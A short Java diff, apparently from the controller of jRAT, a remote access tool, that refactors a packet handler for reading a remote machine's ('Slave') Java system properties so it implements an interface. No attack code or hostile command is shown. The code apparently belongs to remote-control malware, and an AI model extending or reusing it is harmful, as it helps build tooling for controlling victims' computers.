@@ -5,7 +5,7 @@ import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlJVMProperties;
 
 
-public class Packet44SystemJavaProperty extends AbstractIncomingPacket {
+public class Packet44SystemJavaProperty implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
